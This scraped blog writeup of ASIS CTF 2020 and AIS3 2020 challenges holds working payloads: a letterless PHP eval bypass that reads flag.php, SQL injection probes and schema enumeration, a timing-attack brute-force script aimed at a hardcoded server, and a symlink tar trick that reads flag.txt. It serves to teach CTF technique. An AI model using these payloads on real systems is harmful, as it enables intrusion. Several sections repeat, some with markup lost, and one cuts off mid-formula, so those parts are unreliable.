eval($_GET['warmup']); }else{ die(\"Try harder!\"); } }else{ die(\"No param given\"); } From source code, use GET /warmup= to access flag.php, but can’t use letters and payload must be under 60 characters. Key is preg_match bypass - searching found [preg_match bypass in CTF | no-letter webshell] (https://www.cnblogs.com/v01cano/p/11736722.html). Solution 1 is the answer - use “special characters” XORed to produce “letters”: python \u003e\u003e\u003e chr(ord('m')^ord('@')) '-' Meaning @ ^ - = m. Just need to construct payload - though I’m not very familiar with php QQ Referenced other CTF writeups: text $_=']),\u003e'^';@@['; // file $__='\\],::'^'{;@[]'; // 'flag $___='-@-\\\\'^'](]{'; // php' $_($__.$___); // file('flag.php') payload: $_=']),\u003e'^';@@[';$__='\\],::'^'{;@[]';$___='-@-\\\\'^'](]{';$_($__.$___); Unfortunately length is 69, can’t bypass second condition. Using $_='-@-)@]@'^'](]@.;/';$_(); to construct phpinfo(); reveals interesting info… Well not that interesting - server blocked many convenient system functions, so @stavhaygn’s many payload attempts failed. Final answer was simple… readfile('flag.php'); Length: ('[\u003e:@]),\u003e'^')[[$;@@[')('],::.-@-'^';@[]%00](]'); is 49. Hooray. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:3:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#web-web-warm-up-solved"},{"categories":["Cyber Security"],"content":" [Web] Treasury #1 (Unsolved)From challenge link, AE opens popup showing book content, RO opens new window to book source. From treasury.js, book content fetched via /books.php?type=excerpt\u0026id=xx where xx corresponds to the three books (id 1, 2, 3). Then… nothing. We kept poking id with integers or looking for other entry points, ignoring string forms (though I didn’t poke long). Post-competition writeup showed I lacked understanding - even finding SQLi might not have helped QwQ Summarizing writeup: a. Confirm SQLi vulnerabilityUsing id=1' and 1=1; --%20, id=1' and 1=2; --%20 - former returns data, latter shows nothing, meaning statement after command executed. P.S. Note -- comment needs space %20 after, else fails b. Try UNION with other SQL commandsFrom id=9' union select 'hello'; --%20, Warning mentions simplexml_load_string(), indirectly indicating possible XXE vulnerability. c. Confirm database type and versionFrom id=9' union select @@version; --%20 - database is MariaDB version 10.5.4. Writeup provides https://sqliteonline.com/ for testing. d. Gradually guess database columnsSimilar to sqlmap - restore database content from known info. Search “mariadb enumerate columns”. select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --: information_schema.COLUMNS is a View Table object, limit restricts start position (zero-based) and count. e. Gradually restore XML structure dataWriteup uses substr(str, pos, len) to grab XML data, piecing tags together from error messages: text \u003cbook\u003e \u003cid\u003e1\u003c/id\u003e \u003cname\u003eblah\u003c/name\u003e \u003cauthor\u003eblah\u003c/author\u003e \u003cyear\u003eblah\u003c/year\u003e \u003clink\u003eblah\u003c/link\u003e \u003cflag\u003eblah\u003c/flag\u003e \u003cexcerpt\u003eblah\u003c/excerpt\u003e \u003c/book\u003e concat('\u003cbook\u003e\u003cexcerpt\u003e',replace(info, '\u003c', ''),'\u003c/excerpt\u003e\u003c/book\u003e') Finally for complete display (including tags), writeup uses concat joining all strings and replace('\u003c','') removing left angle brackets so tags fail to render. Done. Treasury #2 continues using XXE to grab flag. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:4:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#web-treasury-1-unsolved"},{"categories":["Cyber Security"],"content":" [Web] Treasury #1 (Unsolved)From challenge link, AE opens popup showing book content, RO opens new window to book source. From treasury.js, book content fetched via /books.php?type=excerpt\u0026id=xx where xx corresponds to the three books (id 1, 2, 3). Then… nothing. We kept poking id with integers or looking for other entry points, ignoring string forms (though I didn’t poke long). Post-competition writeup showed I lacked understanding - even finding SQLi might not have helped QwQ Summarizing writeup: a. Confirm SQLi vulnerabilityUsing id=1' and 1=1; --%20, id=1' and 1=2; --%20 - former returns data, latter shows nothing, meaning statement after command executed. P.S. Note -- comment needs space %20 after, else fails b. Try UNION with other SQL commandsFrom id=9' union select 'hello'; --%20, Warning mentions simplexml_load_string(), indirectly indicating possible XXE vulnerability. c. Confirm database type and versionFrom id=9' union select @@version; --%20 - database is MariaDB version 10.5.4. Writeup provides https://sqliteonline.com/ for testing. d. Gradually guess database columnsSimilar to sqlmap - restore database content from known info. Search “mariadb enumerate columns”. select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --: information_schema.COLUMNS is a View Table object, limit restricts start position (zero-based) and count. e. Gradually restore XML structure dataWriteup uses substr(str, pos, len) to grab XML data, piecing tags together from error messages: text 1 blah blah blah blah blah blah concat('',replace(info, '\u003c', ''),'') Finally for complete display (including tags), writeup uses concat joining all strings and replace('\u003c','') removing left angle brackets so tags fail to render. Done. Treasury #2 continues using XXE to grab flag. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:4:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#a-confirm-sqli-vulnerability"},{"categories":["Cyber Security"],"content":" [Web] Treasury #1 (Unsolved)From challenge link, AE opens popup showing book content, RO opens new window to book source. From treasury.js, book content fetched via /books.php?type=excerpt\u0026id=xx where xx corresponds to the three books (id 1, 2, 3). Then… nothing. We kept poking id with integers or looking for other entry points, ignoring string forms (though I didn’t poke long). Post-competition writeup showed I lacked understanding - even finding SQLi might not have helped QwQ Summarizing writeup: a. Confirm SQLi vulnerabilityUsing id=1' and 1=1; --%20, id=1' and 1=2; --%20 - former returns data, latter shows nothing, meaning statement after command executed. P.S. Note -- comment needs space %20 after, else fails b. Try UNION with other SQL commandsFrom id=9' union select 'hello'; --%20, Warning mentions simplexml_load_string(), indirectly indicating possible XXE vulnerability. c. Confirm database type and versionFrom id=9' union select @@version; --%20 - database is MariaDB version 10.5.4. Writeup provides https://sqliteonline.com/ for testing. d. Gradually guess database columnsSimilar to sqlmap - restore database content from known info. Search “mariadb enumerate columns”. select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --: information_schema.COLUMNS is a View Table object, limit restricts start position (zero-based) and count. e. Gradually restore XML structure dataWriteup uses substr(str, pos, len) to grab XML data, piecing tags together from error messages: text 1 blah blah blah blah blah blah concat('',replace(info, '\u003c', ''),'') Finally for complete display (including tags), writeup uses concat joining all strings and replace('\u003c','') removing left angle brackets so tags fail to render. Done. Treasury #2 continues using XXE to grab flag. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:4:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#b-try-union-with-other-sql-commands"},{"categories":["Cyber Security"],"content":" [Web] Treasury #1 (Unsolved)From challenge link, AE opens popup showing book content, RO opens new window to book source. From treasury.js, book content fetched via /books.php?type=excerpt\u0026id=xx where xx corresponds to the three books (id 1, 2, 3). Then… nothing. We kept poking id with integers or looking for other entry points, ignoring string forms (though I didn’t poke long). Post-competition writeup showed I lacked understanding - even finding SQLi might not have helped QwQ Summarizing writeup: a. Confirm SQLi vulnerabilityUsing id=1' and 1=1; --%20, id=1' and 1=2; --%20 - former returns data, latter shows nothing, meaning statement after command executed. P.S. Note -- comment needs space %20 after, else fails b. Try UNION with other SQL commandsFrom id=9' union select 'hello'; --%20, Warning mentions simplexml_load_string(), indirectly indicating possible XXE vulnerability. c. Confirm database type and versionFrom id=9' union select @@version; --%20 - database is MariaDB version 10.5.4. Writeup provides https://sqliteonline.com/ for testing. d. Gradually guess database columnsSimilar to sqlmap - restore database content from known info. Search “mariadb enumerate columns”. select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --: information_schema.COLUMNS is a View Table object, limit restricts start position (zero-based) and count. e. Gradually restore XML structure dataWriteup uses substr(str, pos, len) to grab XML data, piecing tags together from error messages: text 1 blah blah blah blah blah blah concat('',replace(info, '\u003c', ''),'') Finally for complete display (including tags), writeup uses concat joining all strings and replace('\u003c','') removing left angle brackets so tags fail to render. Done. Treasury #2 continues using XXE to grab flag. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:4:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#c-confirm-database-type-and-version"},{"categories":["Cyber Security"],"content":" [Web] Treasury #1 (Unsolved)From challenge link, AE opens popup showing book content, RO opens new window to book source. From treasury.js, book content fetched via /books.php?type=excerpt\u0026id=xx where xx corresponds to the three books (id 1, 2, 3). Then… nothing. We kept poking id with integers or looking for other entry points, ignoring string forms (though I didn’t poke long). Post-competition writeup showed I lacked understanding - even finding SQLi might not have helped QwQ Summarizing writeup: a. Confirm SQLi vulnerabilityUsing id=1' and 1=1; --%20, id=1' and 1=2; --%20 - former returns data, latter shows nothing, meaning statement after command executed. P.S. Note -- comment needs space %20 after, else fails b. Try UNION with other SQL commandsFrom id=9' union select 'hello'; --%20, Warning mentions simplexml_load_string(), indirectly indicating possible XXE vulnerability. c. Confirm database type and versionFrom id=9' union select @@version; --%20 - database is MariaDB version 10.5.4. Writeup provides https://sqliteonline.com/ for testing. d. Gradually guess database columnsSimilar to sqlmap - restore database content from known info. Search “mariadb enumerate columns”. select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --: information_schema.COLUMNS is a View Table object, limit restricts start position (zero-based) and count. e. Gradually restore XML structure dataWriteup uses substr(str, pos, len) to grab XML data, piecing tags together from error messages: text 1 blah blah blah blah blah blah concat('',replace(info, '\u003c', ''),'') Finally for complete display (including tags), writeup uses concat joining all strings and replace('\u003c','') removing left angle brackets so tags fail to render. Done. Treasury #2 continues using XXE to grab flag. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:4:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#d-gradually-guess-database-columns"},{"categories":["Cyber Security"],"content":" [Web] Treasury #1 (Unsolved)From challenge link, AE opens popup showing book content, RO opens new window to book source. From treasury.js, book content fetched via /books.php?type=excerpt\u0026id=xx where xx corresponds to the three books (id 1, 2, 3). Then… nothing. We kept poking id with integers or looking for other entry points, ignoring string forms (though I didn’t poke long). Post-competition writeup showed I lacked understanding - even finding SQLi might not have helped QwQ Summarizing writeup: a. Confirm SQLi vulnerabilityUsing id=1' and 1=1; --%20, id=1' and 1=2; --%20 - former returns data, latter shows nothing, meaning statement after command executed. P.S. Note -- comment needs space %20 after, else fails b. Try UNION with other SQL commandsFrom id=9' union select 'hello'; --%20, Warning mentions simplexml_load_string(), indirectly indicating possible XXE vulnerability. c. Confirm database type and versionFrom id=9' union select @@version; --%20 - database is MariaDB version 10.5.4. Writeup provides https://sqliteonline.com/ for testing. d. Gradually guess database columnsSimilar to sqlmap - restore database content from known info. Search “mariadb enumerate columns”. select column_name from information_schema.COLUMNS where table_name='books' limit 1,1; --: information_schema.COLUMNS is a View Table object, limit restricts start position (zero-based) and count. e. Gradually restore XML structure dataWriteup uses substr(str, pos, len) to grab XML data, piecing tags together from error messages: text 1 blah blah blah blah blah blah concat('',replace(info, '\u003c', ''),'') Finally for complete display (including tags), writeup uses concat joining all strings and replace('\u003c','') removing left angle brackets so tags fail to render. Done. Treasury #2 continues using XXE to grab flag. ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:4:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#e-gradually-restore-xml-structure-data"},{"categories":["Cyber Security"],"content":" [Crypto] Baby RSA (Unsolved)All babies love [RSA]. How about you? python #!/usr/bin/python from Crypto.Util.number import * import random from flag import flag nbit = 512 while True: p = getPrime(nbit) q = getPrime(nbit) e, n = 65537, p*q phi = (p-1)*(q-1) d = inverse(e, phi) r = random.randint(12, 19) if (d-1) % (1 \u003c\u003c r) == 0: break s, t = random.randint(1, min(p, q)), random.randint(1, min(p, q)) t_p = pow(s*p + 1, (d-1)/(1 \u003c\u003c r), n) t_q = pow(t*q + 4, (d-1)/(1 \u003c\u003c r), n) print 'n =', n print 't_p =', t_p print 't_q =', t_q print 'enc =', pow(bytes_to_long(flag), e, n) text n = 10594734342063566757448883321293669290587889620265586736339477212834603215495912433611144868846006156969270740855007264519632640641698642134252272607634933572167074297087706060885814882562940246513589425206930711731882822983635474686630558630207534121750609979878270286275038737837128131581881266426871686835017263726047271960106044197708707310947840827099436585066447299264829120559315794262731576114771746189786467883424574016648249716997628251427198814515283524719060137118861718653529700994985114658591731819116128152893001811343820147174516271545881541496467750752863683867477159692651266291345654483269128390649 t_p = 4519048305944870673996667250268978888991017018344606790335970757895844518537213438462551754870798014432500599516098452334333141083371363892434537397146761661356351987492551545141544282333284496356154689853566589087098714992334239545021777497521910627396112225599188792518283722610007089616240235553136331948312118820778466109157166814076918897321333302212037091468294236737664634236652872694643742513694231865411343972158511561161110552791654692064067926570244885476257516034078495033460959374008589773105321047878659565315394819180209475120634087455397672140885519817817257776910144945634993354823069305663576529148 t_q = 4223555135826151977468024279774194480800715262404098289320039500346723919877497179817129350823600662852132753483649104908356177392498638581546631861434234853762982271617144142856310134474982641587194459504721444158968027785611189945247212188754878851655525470022211101581388965272172510931958506487803857506055606348311364630088719304677522811373637015860200879231944374131649311811899458517619132770984593620802230131001429508873143491237281184088018483168411150471501405713386021109286000921074215502701541654045498583231623256365217713761284163181132635382837375055449383413664576886036963978338681516186909796419 enc = 5548605244436176056181226780712792626658031554693210613227037883659685322461405771085980865371756818537836556724405699867834352918413810459894692455739712787293493925926704951363016528075548052788176859617001319579989667391737106534619373230550539705242471496840327096240228287029720859133747702679648464160040864448646353875953946451194177148020357408296263967558099653116183721335233575474288724063742809047676165474538954797346185329962114447585306058828989433687341976816521575673147671067412234404782485540629504019524293885245673723057009189296634321892220944915880530683285446919795527111871615036653620565630 Given code and output.txt, find flag. Information-rich crypto challenge - initially ignored lines 18-20, just wondering if flag could be assembled from output.txt. Also found n can’t be factored via factordb.com into p, q. Realistic: given ciphertext enc, public key (e, n), plus strange clues t_p, t_q. Reference writeup First half While is standard RSA. From writeup, key is lines 18-20… sounds obvious, but I ignored them since line 18’s s, t are randomly generated from p, q. Even knowing n indirectly fixes p, q, can’t deduce without factoring, let alone finding d. Spent time randomly deriving equations == Real key is line 19: t_p = pow(s*p + 1, (d-1)/(1 \u003c\u003c r), n). Given known $t_p$: tp=(s∗p+1)(d−1)/(1\u003c\u003cr)t_p = (s*p + 1) ^ {(d-1)/(1\u003c\u003cr)}tp​=(s∗p+1)(d−1)/(1\u003c\u003cr)Writeup explains right side except $1$ is divisible by $p$. My understanding: Let $x = s * p$, for $(x + 1) ^ k$ with $k = 2, 3$: \\[(x+1)^2 = x^2 + 2\\*x\\*1 +","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:5:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#crypto-baby-rsa-unsolved"},{"categories":["Cyber Security"],"content":" [Misc][Forensics] AdventureTime plays a role in almost every decision. And some decisions define your attitude about time. Can you [README.txt]? It’s time for a new adventure! Note: Slow-download is international and part of the task. Challenge gives download link, recall about 4GB, then you realize download is super slow and keeps disconnecting XDD So I kept clicking download… naturally no results~ After reading writeup, realized this challenge was actually quite fun!! If I have time, hope to add my own exploration thoughts here \u003e\u003c ","date":"2020-07-14","objectID":"/en/posts/2020/asisctf-qual-2020/:6:0","series":null,"tags":["ASIS CTF","Sharing"],"title":"[Sharing] ASIS CTF Quals 2020","uri":"/en/posts/2020/asisctf-qual-2020/#miscforensics-adventure"},{"categories":["Cyber Security"],"content":"AIS3 2020 cybersecurity summer camp pre-exam writeups","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/"},{"categories":["Cyber Security"],"content":" My first time participating in the 3-day AIS3 pre-exam, so excited! \u003e\u003c Though at my age I’m a bit late. Seeing so many high school students participating made me wonder what I was doing in high school lol I’m used to seeking guidance from @stavhaygn during CTFTime online competitions, but this individual competition is all on me QwQ ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:0:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#"},{"categories":["Cyber Security"],"content":" ForewordFirst, here’s my ranking screenshot (Rank 113/427), though the results aren’t great lol This writeup basically covers all challenges under 300 points. Suggestions are welcome. (Each challenge starts at 500 points. According to the official scoring rules, when 180 people solve it, it drops to minimum 100 points.) ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:1:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#foreword"},{"categories":["Cyber Security"],"content":" Official Writeups Misc Reverse Pwn Crypto Web ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:1:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#official-writeups"},{"categories":["Cyber Security"],"content":" Misc","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:0","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#misc"},{"categories":["Cyber Security"],"content":" Piquero (100 points, 347 solves) Description SolutionUse the online tool Braille Decoder. Note the Braille capitalization rules (.a = A). Many people, including me, made errors from this XD For more details, check out this video on Braille. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#piquero-100-points-347-solves"},{"categories":["Cyber Security"],"content":" Piquero (100 points, 347 solves) Description SolutionUse the online tool Braille Decoder. Note the Braille capitalization rules (.a = A). Many people, including me, made errors from this XD For more details, check out this video on Braille. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description"},{"categories":["Cyber Security"],"content":" Piquero (100 points, 347 solves) Description SolutionUse the online tool Braille Decoder. Note the Braille capitalization rules (.a = A). Many people, including me, made errors from this XD For more details, check out this video on Braille. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:1","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution"},{"categories":["Cyber Security"],"content":" Karuego (100 points, 245 solves) DescriptionThe challenge gives a Karuego image (reference to “Iruma-kun Demon School!”). Get it HERE. SolutionMy intuition was image steganography. Usually I first use binwalk to check for hidden files, but here I directly threw it into stegsolve and accidentally found a strange key in LSB, then went back to use foremost to find the compressed file hidden in the image XD. Solution 2After the competition, talking with @stavhaygn I learned that after finding the zip with binwalk, you can use the KPA (known plaintext attack) tool PKcrack to crack the password. The official Discord also mentioned this approach, so it seems to be an intended solution. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#karuego-100-points-245-solves"},{"categories":["Cyber Security"],"content":" Karuego (100 points, 245 solves) DescriptionThe challenge gives a Karuego image (reference to “Iruma-kun Demon School!”). Get it HERE. SolutionMy intuition was image steganography. Usually I first use binwalk to check for hidden files, but here I directly threw it into stegsolve and accidentally found a strange key in LSB, then went back to use foremost to find the compressed file hidden in the image XD. Solution 2After the competition, talking with @stavhaygn I learned that after finding the zip with binwalk, you can use the KPA (known plaintext attack) tool PKcrack to crack the password. The official Discord also mentioned this approach, so it seems to be an intended solution. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-1"},{"categories":["Cyber Security"],"content":" Karuego (100 points, 245 solves) DescriptionThe challenge gives a Karuego image (reference to “Iruma-kun Demon School!”). Get it HERE. SolutionMy intuition was image steganography. Usually I first use binwalk to check for hidden files, but here I directly threw it into stegsolve and accidentally found a strange key in LSB, then went back to use foremost to find the compressed file hidden in the image XD. Solution 2After the competition, talking with @stavhaygn I learned that after finding the zip with binwalk, you can use the KPA (known plaintext attack) tool PKcrack to crack the password. The official Discord also mentioned this approach, so it seems to be an intended solution. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-1"},{"categories":["Cyber Security"],"content":" Karuego (100 points, 245 solves) DescriptionThe challenge gives a Karuego image (reference to “Iruma-kun Demon School!”). Get it HERE. SolutionMy intuition was image steganography. Usually I first use binwalk to check for hidden files, but here I directly threw it into stegsolve and accidentally found a strange key in LSB, then went back to use foremost to find the compressed file hidden in the image XD. Solution 2After the competition, talking with @stavhaygn I learned that after finding the zip with binwalk, you can use the KPA (known plaintext attack) tool PKcrack to crack the password. The official Discord also mentioned this approach, so it seems to be an intended solution. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:2","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-2"},{"categories":["Cyber Security"],"content":" Soy (139 points, 172 solves) Description SolutionUse the online tool qrazybox to restore the QRcode. From QRcode dimensions we know it’s ver.2. For format info, find the combination matching the challenge through Error Correction Level and Mask Pattern. Just fill in the squares and you’ll get the Flag. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#soy-139-points-172-solves"},{"categories":["Cyber Security"],"content":" Soy (139 points, 172 solves) Description SolutionUse the online tool qrazybox to restore the QRcode. From QRcode dimensions we know it’s ver.2. For format info, find the combination matching the challenge through Error Correction Level and Mask Pattern. Just fill in the squares and you’ll get the Flag. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-2"},{"categories":["Cyber Security"],"content":" Soy (139 points, 172 solves) Description SolutionUse the online tool qrazybox to restore the QRcode. From QRcode dimensions we know it’s ver.2. For format info, find the combination matching the challenge through Error Correction Level and Mask Pattern. Just fill in the squares and you’ll get the Flag. ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:3","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-3"},{"categories":["Cyber Security"],"content":" Saburo (359 points, 108 solves) DescriptionThe challenge requires nc to the official Server. After entering a string, you get “Haha, you lose in xx milliseconds.” where xx is a randomly varying number (entering the same string “a” returns numbers ranging 11-15). Testing reveals that input closer to the flag gives larger numbers until you guess the flag. PS. flag is printable characters with AIS3{…} SolutionFor the test table, considering the flag may have letters, numbers, and characters like {, }, _, we can use python’s string library. Then guess character by character, testing each character in the table 10 times statistically to find the one returning max ms. If no number is returned, we’ve hit the flag XD. Also, since we need to continuously nc the official Server, we need to specifically use conn.close() to close connections, otherwise it will error after running a while. I got stuck here for a bit… showing that good programming habits are important. python from pwn import * from string import * table = list(ascii_letters+digits+punctuation) #flag = \"AIS3{A1r1ght_U_4r3_my_3n3nnies}\" flag = \"AIS3{\" while True: max_val = 0 target = '' for ch in table: payload = flag + ch max_local = 0 for j in range(10): conn = remote(\"60.250.197.227\", 11001) conn.recvuntil('Flag:') conn.sendline(payload) try: res = int(conn.recvline().split()[-2]) conn.close() except: print(flag + ch) conn.close() sys.exit(0) max_local = max(max_local, res) if max_local \u003e max_val: target = ch max_val = max_local flag = flag + target print(flag) ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:4","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#saburo-359-points-108-solves"},{"categories":["Cyber Security"],"content":" Saburo (359 points, 108 solves) DescriptionThe challenge requires nc to the official Server. After entering a string, you get “Haha, you lose in xx milliseconds.” where xx is a randomly varying number (entering the same string “a” returns numbers ranging 11-15). Testing reveals that input closer to the flag gives larger numbers until you guess the flag. PS. flag is printable characters with AIS3{…} SolutionFor the test table, considering the flag may have letters, numbers, and characters like {, }, _, we can use python’s string library. Then guess character by character, testing each character in the table 10 times statistically to find the one returning max ms. If no number is returned, we’ve hit the flag XD. Also, since we need to continuously nc the official Server, we need to specifically use conn.close() to close connections, otherwise it will error after running a while. I got stuck here for a bit… showing that good programming habits are important. python from pwn import * from string import * table = list(ascii_letters+digits+punctuation) #flag = \"AIS3{A1r1ght_U_4r3_my_3n3nnies}\" flag = \"AIS3{\" while True: max_val = 0 target = '' for ch in table: payload = flag + ch max_local = 0 for j in range(10): conn = remote(\"60.250.197.227\", 11001) conn.recvuntil('Flag:') conn.sendline(payload) try: res = int(conn.recvline().split()[-2]) conn.close() except: print(flag + ch) conn.close() sys.exit(0) max_local = max(max_local, res) if max_local \u003e max_val: target = ch max_val = max_local flag = flag + target print(flag) ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:4","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#description-3"},{"categories":["Cyber Security"],"content":" Saburo (359 points, 108 solves) DescriptionThe challenge requires nc to the official Server. After entering a string, you get “Haha, you lose in xx milliseconds.” where xx is a randomly varying number (entering the same string “a” returns numbers ranging 11-15). Testing reveals that input closer to the flag gives larger numbers until you guess the flag. PS. flag is printable characters with AIS3{…} SolutionFor the test table, considering the flag may have letters, numbers, and characters like {, }, _, we can use python’s string library. Then guess character by character, testing each character in the table 10 times statistically to find the one returning max ms. If no number is returned, we’ve hit the flag XD. Also, since we need to continuously nc the official Server, we need to specifically use conn.close() to close connections, otherwise it will error after running a while. I got stuck here for a bit… showing that good programming habits are important. python from pwn import * from string import * table = list(ascii_letters+digits+punctuation) #flag = \"AIS3{A1r1ght_U_4r3_my_3n3nnies}\" flag = \"AIS3{\" while True: max_val = 0 target = '' for ch in table: payload = flag + ch max_local = 0 for j in range(10): conn = remote(\"60.250.197.227\", 11001) conn.recvuntil('Flag:') conn.sendline(payload) try: res = int(conn.recvline().split()[-2]) conn.close() except: print(flag + ch) conn.close() sys.exit(0) max_local = max(max_local, res) if max_local \u003e max_val: target = ch max_val = max_local flag = flag + target print(flag) ","date":"2020-06-30","objectID":"/en/posts/2020/ais3-2020-preexam-writeups/:2:4","series":null,"tags":["AIS3","CTF-Writeup"],"title":"[Writeup] AIS3 2020 Pre-exam","uri":"/en/posts/2020/ais3-2020-preexam-writeups/#solution-4"},{"categories":["Cyber Security"],"content":" Shichirou (Post-solved, 450 points, 65 solves) DescriptionSimilarly requires nc to the official Server and find a way to get the flag through the source code. python #!/usr/bin/env python3 import os import sys import tempfile import subprocess import resource resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536)) os.chdir(os.environ['HOME']) size = int(sys.stdin.readline().rstrip('\\r\\n')) if size \u003e 65536: print('File is too large.') quit() data = sys.stdin.read(size) with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf: with tempfile.TemporaryDirectory(dir='.') as outdir: tarf.write(data) tarf.flush() try: subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir]) except: print('Broken tar file.') raise try: a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt']) b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')]) a = a.split(b' ')[0] b = b.split(b' ')[0] assert len(a) == 40 and len(b) == 40 if a != b: raise Exception('sha1') except: print('Different.') raise print(open('flag.txt', 'r').readline()) SolutionAfter the competition, @stavhaygn mentioned this challenge was old for MacacaHub… from last year’s CSC Finals== Though from my 108 CSC Finals writeup, I didn’t participate in solving it. Darn QwQ Brief explanation of the code above: line 12 is basically inputting a number, the file size. line 17, 18 input a tar packaged file (can use pwntool), then unpack at line 23. line 29 - 35 SHA-1 compare guess.txt and flag.txt on the Server. If they match, output the flag. At first glance I thought it was SHA-1 bypass, but we can’t modify Server files. So what are we supposed to upload? The key is Symbolic link, somewhat like creating a shortcut, linking guess.txt and flag.txt together. First, create the link locally and check with ls. bash $ ln -s flag.txt guess.txt $ ls -al lrwxrwxrwx ... guess.txt -\u003e flag.txt Then tar package it (no compression). bash $ tar cvf guess.tar 